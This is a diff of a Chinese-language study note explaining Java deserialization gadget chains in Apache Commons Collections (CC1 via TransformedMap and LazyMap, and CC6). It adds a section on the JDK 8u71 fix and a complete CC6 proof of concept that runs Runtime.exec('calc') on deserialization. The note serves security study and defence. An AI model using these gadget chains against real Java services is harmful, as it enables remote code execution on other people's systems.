@@ -8,9 +8,11 @@ tags:
 
 Apache Commons是Apache开源的Java通用类项目，在Java中项目中被广泛的使用，Apache Commons当中有一个组件叫做`Apache Commons Collections`，主要封装了Java的Collection（集合）相关类对象。本节将逐步详解Collections反序列化攻击链(仅以TransformedMap调用链为示例)最终实现反序列化RCE。
 
+![alt text](img/cc.png)
 
-## 1 CC1-TransformedMap
-### Transformer
+## 1 CC1
+### 1.1 TransformedMap
+#### Transformer
 
 `Transformer`是`org.apache.commons.collections.Transformer`接口的实现类，`Transformer`接口定义了一个`transform`方法，用于对输入的对象进行转换。
 ```java title="org.apache.commons.collections.Transformer"
@@ -30,7 +32,7 @@ Apache Commons是Apache开源的Java通用类项目，在Java中项目中被广�
 
 该接口的重要实现类有：`ConstantTransformer`、`invokerTransformer`、`ChainedTransformer`、`TransformedMap`
 
-### ConstantTransformer
+#### ConstantTransformer
 
 ConstantTransformer，常量转换：传入对象不会经过任何改变直接返回。
 
@@ -73,7 +75,7 @@ public class ConstantTransformer implements Transformer, Serializable {
 }
 ```
 
-### InvokerTransformer
+#### InvokerTransformer
 
 `org.apache.commons.collections.functors.InvokerTransformer`实现了`java.io.Serializable`接口。2015年有研究者发现利用`InvokerTransformer`类的`transform`方法可以实现Java反序列化RCE，并提供了利用方法：[ysoserial CC1](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java){target="_blank"}
 
@@ -122,7 +124,7 @@ public class InvokerTransformer implements Transformer, Serializable {
 }
 ```
 
-### ChainedTransformer
+#### ChainedTransformer
 
 `org.apache.commons.collections.functors.ChainedTransformer` 类封装了`Transformer`的链式调用，对于传入的`Transformer`数组，`ChainedTransformer`依次调用每一个`Transformer`的`transform`方法。
 
@@ -210,7 +212,7 @@ public class ChainedTransformer implements Transformer, Serializable {
     运行结果如下：
     ![alt text](img/11.png)
 
-### 利用InvokerTransformer执行本地命令
+#### 利用InvokerTransformer执行本地命令
 
 现在我们已经使用`InvokerTransformer`创建了一个含有恶意调用链的Transformer类的Map对象，紧接着我们应该思考如何才能够将调用链串起来并执行。
 
@@ -291,7 +293,7 @@ public static Map decorateTransform(Map map, Transformer keyTransformer, Transfo
 2. 并且可以传入我们构建的`TransformedMap`对象
 3. 调用了`TransformedMap`中的`setValue`/`put`/`putAll`中的任意方法一个方法的类
 
-### AnnotationInvocationHandler
+#### AnnotationInvocationHandler
 
 `sun.reflect.annotation.AnnotationInvocationHandler`类实现了`java.lang.reflect.InvocationHandler`(Java动态代理)接口和`java.io.Serializable`接口，它还重写了`readObject`方法，在`readObject`方法中间接的调用了`TransformedMap中MapEntry`的`setValue`方法，从而完成了整个攻击链的调用。
 
@@ -376,7 +378,7 @@ class AnnotationInvocationHandler implements InvocationHandler, Serializable {
     // Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
     Object instance = constructor.newInstance(Target.class, transformedMap);
     ```
-### PoC
+#### PoC
 
 ```java
 import org.apache.commons.collections.Transformer;
@@ -432,7 +434,7 @@ public class cc1 {
 }
 ```
 
-## 2 CC1-LazyMap
+### 1.2 LazyMap
 
 !!! tips "版本要求"
 
@@ -452,7 +454,7 @@ public class cc1 {
 
 LazyMap链的后半部分与TransformedMap相同，区别在于LazyMap替换了TransformedMap
 
-### LazyMap
+#### LazyMap
 ChainedTransformer的transform方法通过FindUsages查询发现也可以在LazyMap中找到，并且factory也非常好控制
 
 CC1链核心就是找到触发`ChainedTransformer.transform`方法的位置，通过find usage发现lazymap的get方法中调用了transform方法
@@ -534,7 +536,7 @@ public class lazymap {
 
 ![alt text](img/9.png){loading="lazy"}
 
-### AnnotationInvocationHandler
+#### AnnotationInvocationHandler
 
 接下来考虑如何触发 LazyMap 对象的get方法，在 AnnotationInvocationHandler 的 invoke 方法中
 
@@ -585,6 +587,7 @@ public class lazymap {
 最后寻找无参调用代理对象的方法，就近使用readObject中的循环语句 ```for (Map.Entry<String, Object> memberValue : memberValues.entrySet())``` 。只要触发readObject方法即可
 
 回顾总结利用链：
+
 1. 通过反射获取`AnnotationInvocationHandler`类构造方法
 2. 用`AnnotationInvocationHandler`类作为代理处理器创建代理对象`proxyInstance`
 3. 再次用反射创建`AnnotationInvocationHandler`类对象 o，将其`memberValues`变量设置为`proxyInstance`
@@ -612,9 +615,10 @@ ObjectInputStream.readObject()
 								Runtime.exec()
 ```
 
-### PoC
+#### PoC
 
-IDEA 调试的时候遇到了奇怪的问题，执行完 Proxy.newProxyInstance 之后，程序就开始弹出计算器，原因未知。
+!!! question
+    IDEA 调试的时候遇到了奇怪的问题，执行完 Proxy.newProxyInstance 之后，程序就开始弹出计算器，原因未知。（`toString()`已经关掉了）
 
 ```java
 import org.apache.commons.collections.Transformer;
@@ -685,8 +689,190 @@ public class cc11 {
 }
 ```
 
+### 1.3 修复
+
+CC1链在jdk 8u71版本进行了修复，在`AnnotationInvocationHandler`类的`readObject`方法中移除了`setValue`方法，因此TransformedMap链无法触发。
+
+同时`MemberValues.entrySet()`方法也被改成了先由`streamValues`复制MemberValues，再遍历`streamValues.entrySet()`，因此移除了代理对象的无参调用方法，无法触发invoke方法进入LazyMap链。
+
+```java
+    private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        ObjectInputStream.GetField fields = s.readFields();
+
+        @SuppressWarnings("unchecked")
+        Class<? extends Annotation> t = (Class<? extends Annotation>)fields.get("type", null);
+        @SuppressWarnings("unchecked")
+        Map<String, Object> streamVals = (Map<String, Object>)fields.get("memberValues", null);
+
+        // Check to make sure that types have not evolved incompatibly
+
+        AnnotationType annotationType = null;
+        try {
+            annotationType = AnnotationType.getInstance(t);
+        } catch(IllegalArgumentException e) {
+            // Class is no longer an annotation type; time to punch out
+            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
+        }
+
+        Map<String, Class<?>> memberTypes = annotationType.memberTypes();
+        // consistent with runtime Map type
+        Map<String, Object> mv = new LinkedHashMap<>();
+
+        // If there are annotation members without values, that
+        // situation is handled by the invoke method.
+        for (Map.Entry<String, Object> memberValue : streamVals.entrySet()) {
+            String name = memberValue.getKey();
+            Object value = null;
+            Class<?> memberType = memberTypes.get(name);
+            if (memberType != null) {  // i.e. member still exists
+                value = memberValue.getValue();
+                if (!(memberType.isInstance(value) ||
+                      value instanceof ExceptionProxy)) {
+                    value = new AnnotationTypeMismatchExceptionProxy(
+                            value.getClass() + "[" + value + "]").setMember(
+                                annotationType.members().get(name));
+                }
+            }
+            mv.put(name, value);
+        }
+
+        UnsafeAccessor.setType(this, t);
+        UnsafeAccessor.setMemberValues(this, mv);
+    }
+```
+## 2 CC6
+
+!!! tips "版本要求"
+
+    JDK 7、8 均不受限制
+
+由于对CC1链的修复，`AnnotationInvocationHandler`已不可用，因此我们需要找到新的方法触发LazyMap的get方法，get之后的利用流程与CC1-LazyMap相同。
+
+这里我们找到了`org.apache.commons.collections.keyvalue.TiedMapEntry`类，在`hashCode`方法中调用了`getValue`方法，其中调用了`get`
+
+```java
+    public Object getValue() {
+        return map.get(key);
+    }
+    public int hashCode() {
+        Object value = getValue();
+        return (getKey() == null ? 0 : getKey().hashCode()) ^
+               (value == null ? 0 : value.hashCode()); 
+    }    
+```
+
+与URLDNS链类似，我们可以使用hashMap的`readObject`方法触发`hashCode`方法，进入`TiedMapEntry.hashCode`，利用链构造完成。
+
+在编写过程中存在一些值得注意的问题：
+
+若我们直接如下编写，会发现在`hashMap1.put`就弹出计算器，并在后续反序列化阶段报错，这是因为HashMap的put方法也会调用`hashCode(key)`(这一点在URLDNS链中也有提及)，因此我们需要通过反射修改链的一部分使其在构造阶段不触发。
+
+??? note "code"
+
+    ```java
+        public static void main(String[] args) throws Exception {  
+            Transformer transformer[]= new Transformer[]{
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+            };
+            ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
+            HashMap hashMap = new HashMap();
+            LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);
+            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "cc6");
+            HashMap hashMap1 = new HashMap();
+            hashMap1.put(tiedMapEntry, "cc6");
+
+            serialize(hashMap1,"cc6.bin");
+            unserialize("cc6.bin");
+        }
+    ```
+
+这里常见的方法是先将LazyMap的Factor设为ConstantTransformor，构造完成后再反射修改回原值。
+
+同时，还需要注意到LazyMap若想触发Transform方法，需要满足条件`map.containsKey(key) == false`，但同样的，hashMap的put时会调用LazyMap的get方法并向其中插入key，此后反序列化时无法触发，因此put后需要通过反射修改lazyMap的map使其为空。
+
+```java title="LazyMap.get()"
+    public Object get(Object key) {
+        // create value for key if key is not currently in the map
+        if (map.containsKey(key) == false) {
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        }
+        return map.get(key);
+    }
+```
+
+### PoC
+
+```java
+package cc.cc6;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+
+import java.io.*;
+import java.util.HashMap;
+import java.lang.reflect.Field;
+
+public class exp {
+    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
+        Object o = ois.readObject();
+        ois.close();
+        System.out.println("Finish unserialize");
+    }
+    public static void serialize(Object o, String filename) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
+        oos.writeObject(o);
+        oos.close();
+        System.out.println("Finish serialize");
+    }
+    public static void main(String[] args) throws Exception {
+        Transformer transformer[]= new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
+        HashMap hashMap = new HashMap();
+
+        // 设置为ConstantTransformer 防止在put时触发transform
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(hashMap, new ConstantTransformer(0));
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "cc6");
+        HashMap hashMap1 = new HashMap();
+        hashMap1.put(tiedMapEntry, "cc6");
+
+        // 反射修改 LazyMap 的 factory 为构造的 chainedTransformer
+        Class clazz=LazyMap.class;
+        Field lazyfact=clazz.getDeclaredField("factory");
+        lazyfact.setAccessible(true);
+        lazyfact.set(lazyMap,chainedTransformer);
+
+        // 反射修改 LazyMap 的 map 为空
+        // LazyMap的map继承自父类 org.apache.commons.collections.map.AbstractMapDecorator
+        clazz=clazz.getSuperclass();
+        Field lazymap=clazz.getDeclaredField("map");
+        lazymap.setAccessible(true);
+        HashMap hashMap2 = new HashMap();
+        lazymap.set(lazyMap,hashMap2);
+
+        serialize(hashMap1,"cc6.bin");
+        unserialize("cc6.bin");
+    }
+}
+```
+
 ## 参考资料
 
 
 1. [Commons-Collections反序列化漏洞复现](https://www.cnblogs.com/BUTLER/p/16478574.html){target="_blank"}
-2. [Java安全 CC链1分析(Lazymap类)](https://blog.csdn.net/Elite__zhb/article/details/136097084){target="_blank"}
+2. [Java安全CC1分析(Lazymap类)](https://blog.csdn.net/Elite__zhb/article/details/136097084){target="_blank"}
